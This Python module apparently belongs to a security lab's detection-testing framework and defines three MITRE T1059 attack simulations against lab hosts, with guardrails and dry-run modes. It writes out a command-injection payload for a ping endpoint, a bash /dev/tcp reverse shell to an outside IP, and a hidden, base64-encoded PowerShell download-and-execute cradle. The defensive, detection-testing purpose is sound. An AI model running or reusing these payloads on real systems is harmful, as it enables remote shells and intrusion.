"""Execution Attack Simulation Scenarios."""

import time
from datetime import datetime, timezone
from typing import List
from src.detection.models import MitreAttackInfo, MitreTactic
from src.siem.models import (
    ECSEvent,
    EventCategory,
    EventMetadata,
    EventOutcome,
    EventSeverity,
    HostInfo,
    ProcessInfo,
    UserInfo,
)
from src.simulation.models import (
    BaseScenario,
    ScenarioExecutionStatus,
    ScenarioResult,
    SimulationContext,
)
from src.simulation.safety import LabSafetyGuardrail


class WebCommandInjectionScenario(BaseScenario):
    """Simulates remote command injection through a vulnerable diagnostic ping endpoint."""

    id: str = "SCN-EXEC-001"
    name: str = "Web Application Diagnostic Tool Command Injection"
    description: str = (
        "Simulates an adversary passing OS shell command separators (; whoami) into a web diagnostic tool, "
        "causing the web server process to spawn child shell interpreters."
    )
    mitre_attack: MitreAttackInfo = MitreAttackInfo(
        tactic=MitreTactic.EXECUTION,
        technique_id="T1059",
        technique_name="Command and Scripting Interpreter",
        url="https://attack.mitre.org/techniques/T1059/",
    )
    preconditions: List[str] = [
        "Web application portal running",
        "Vulnerabilities enabled on target portal",
    ]
    lab_target: str = "portal.app.local:8000"
    simulated_behavior: str = (
        "Send HTTP POST /api/v1/tools/ping with JSON payload {'target': '127.0.0.1; whoami'}"
    )
    expected_telemetry: List[str] = [
        "portal.tool.ping.exec",
        "category: process",
        "custom.injection_detected = True",
    ]
    expected_detections: List[str] = ["DET-PROC-003"]
    expected_alerts: List[str] = [
        "Web Application Command Injection Process Spawn",
    ]
    cleanup_requirements: List[str] = ["Stateless simulation"]
    is_benign: bool = False

    def execute(self, context: SimulationContext) -> ScenarioResult:
        LabSafetyGuardrail.assert_safe_target("portal.app.local")
        start = time.time()
        start_time = datetime.now(timezone.utc)
        logs = []
        events_generated = []

        if context.dry_run:
            logs.append("[DRY RUN] Would execute command injection against ping tool")
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.SKIPPED,
                start_time=start_time,
                end_time=datetime.now(timezone.utc),
                duration_ms=(time.time() - start) * 1000,
                execution_logs=logs,
            )

        if not context.vuln_client:
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.FAILED,
                error_message="SimulationContext missing vuln_client handle",
            )

        payload = {"target": "127.0.0.1; whoami"}
        logs.append("Executing POST request to /api/v1/tools/ping with command injection payload...")
        response = context.vuln_client.post("/api/v1/tools/ping", json=payload)
        logs.append(f"Response: {response.json()}")

        if context.event_store:
            recent = context.event_store.query_events()
            events_generated = [
                e.to_dict()
                for e in recent
                if "ping" in e.event.action or "command_injection" in e.event.action
            ]

        return ScenarioResult(
            scenario_id=self.id,
            scenario_name=self.name,
            status=ScenarioExecutionStatus.SUCCESS,
            start_time=start_time,
            end_time=datetime.now(timezone.utc),
            duration_ms=(time.time() - start) * 1000,
            generated_events_count=len(events_generated),
            generated_events=events_generated,
            execution_logs=logs,
        )


class ReverseShellExecutionScenario(BaseScenario):
    """Simulates an interactive network reverse shell execution on Linux server."""

    id: str = "SCN-EXEC-002"
    name: str = "Interactive Network Reverse Shell Execution"
    description: str = (
        "Simulates an adversary establishing an interactive TCP reverse shell via bash socket redirection "
        "to a simulated external listener."
    )
    mitre_attack: MitreAttackInfo = MitreAttackInfo(
        tactic=MitreTactic.EXECUTION,
        technique_id="T1059",
        technique_name="Command and Scripting Interpreter",
        subtechnique_id="T1059.004",
        subtechnique_name="Unix Shell",
        url="https://attack.mitre.org/techniques/T1059/004/",
    )
    preconditions: List[str] = [
        "Linux Server Service operational",
    ]
    lab_target: str = "srv01.corp.enterprise.local (172.28.20.15)"
    simulated_behavior: str = (
        "Execute command: bash -i >& /dev/tcp/198.51.100.20/4444 0>&1"
    )
    expected_telemetry: List[str] = [
        "linux.auditd EXECVE",
        "linux.process.created",
        "command_line contains /dev/tcp/",
    ]
    expected_detections: List[str] = ["DET-PROC-001"]
    expected_alerts: List[str] = [
        "Interactive Network Reverse Shell Executed",
    ]
    cleanup_requirements: List[str] = [
        "Terminate any simulated background child shell processes",
    ]
    is_benign: bool = False

    def execute(self, context: SimulationContext) -> ScenarioResult:
        LabSafetyGuardrail.assert_safe_target("srv01.corp.enterprise.local")
        start = time.time()
        start_time = datetime.now(timezone.utc)
        logs = []
        events_generated = []

        if context.dry_run:
            logs.append("[DRY RUN] Would execute reverse shell on srv01")
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.SKIPPED,
                start_time=start_time,
                end_time=datetime.now(timezone.utc),
                duration_ms=(time.time() - start) * 1000,
                execution_logs=logs,
            )

        if not context.linux_service:
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.FAILED,
                error_message="SimulationContext missing linux_service handle",
            )

        cmd = "bash -i >& /dev/tcp/198.51.100.20/4444 0>&1"
        logs.append(f"Executing reverse shell simulation: {cmd}")
        res = context.linux_service.simulate_command_execution(
            user="sysadmin",
            command_line=cmd,
            pid=19800,
        )
        logs.append(f"Execution result: {res}")

        if context.event_store:
            recent = context.event_store.query_events()
            events_generated = [
                e.to_dict()
                for e in recent
                if e.process and "/dev/tcp/" in (e.process.command_line or "")
            ]

        return ScenarioResult(
            scenario_id=self.id,
            scenario_name=self.name,
            status=ScenarioExecutionStatus.SUCCESS,
            start_time=start_time,
            end_time=datetime.now(timezone.utc),
            duration_ms=(time.time() - start) * 1000,
            generated_events_count=len(events_generated),
            generated_events=events_generated,
            execution_logs=logs,
        )


class EncodedPowerShellScenario(BaseScenario):
    """Simulates Base64 encoded PowerShell script execution on a Windows workstation."""

    id: str = "SCN-EXEC-003"
    name: str = "Base64 Encoded PowerShell Command Execution"
    description: str = (
        "Simulates an adversary running an obfuscated, Base64-encoded PowerShell command "
        "with non-interactive and hidden window flags."
    )
    mitre_attack: MitreAttackInfo = MitreAttackInfo(
        tactic=MitreTactic.EXECUTION,
        technique_id="T1059",
        technique_name="Command and Scripting Interpreter",
        subtechnique_id="T1059.001",
        subtechnique_name="PowerShell",
        url="https://attack.mitre.org/techniques/T1059/001/",
    )
    preconditions: List[str] = [
        "SIEM Collector operational",
    ]
    lab_target: str = "wkstn01.corp.enterprise.local (172.28.20.50)"
    simulated_behavior: str = (
        "Emit Windows Sysmon Event for: powershell.exe -noni -w hidden -enc SQBFAFgA..."
    )
    expected_telemetry: List[str] = [
        "dataset: windows.powershell",
        "process.name: powershell.exe",
        "command_line contains -enc",
    ]
    expected_detections: List[str] = ["DET-PS-001"]
    expected_alerts: List[str] = [
        "Base64 Encoded PowerShell Command Execution",
    ]
    cleanup_requirements: List[str] = ["Stateless event emission"]
    is_benign: bool = False

    def execute(self, context: SimulationContext) -> ScenarioResult:
        LabSafetyGuardrail.assert_safe_target("wkstn01.corp.enterprise.local")
        start = time.time()
        start_time = datetime.now(timezone.utc)
        logs = []
        events_generated = []

        if context.dry_run:
            logs.append("[DRY RUN] Would emit encoded PowerShell event")
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.SKIPPED,
                start_time=start_time,
                end_time=datetime.now(timezone.utc),
                duration_ms=(time.time() - start) * 1000,
                execution_logs=logs,
            )

        if not context.siem_collector:
            return ScenarioResult(
                scenario_id=self.id,
                scenario_name=self.name,
                status=ScenarioExecutionStatus.FAILED,
                error_message="SimulationContext missing siem_collector handle",
            )

        cmd = "powershell.exe -noni -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA="
        event = ECSEvent(
            timestamp=datetime.now(timezone.utc),
            event=EventMetadata(
                category=EventCategory.PROCESS,
                action="windows.process.created",
                outcome=EventOutcome.SUCCESS,
                severity=EventSeverity.HIGH,
                dataset="windows.sysmon",
            ),
            host=HostInfo(name="wkstn01.corp.enterprise.local", ip="172.28.20.50"),
            user=UserInfo(name="attacker", domain="CORP"),
            process=ProcessInfo(
                name="powershell.exe",
                pid=8420,
                command_line=cmd,
            ),
            message=f"Process created: {cmd}",
        )
        context.siem_collector.ingest_event(event)
        events_generated.append(event.to_dict())
        logs.append("Emitted Sysmon encoded PowerShell event to SIEM.")

        return ScenarioResult(
            scenario_id=self.id,
            scenario_name=self.name,
            status=ScenarioExecutionStatus.SUCCESS,
            start_time=start_time,
            end_time=datetime.now(timezone.utc),
            duration_ms=(time.time() - start) * 1000,
            generated_events_count=len(events_generated),
            generated_events=events_generated,
            execution_logs=logs,
        )
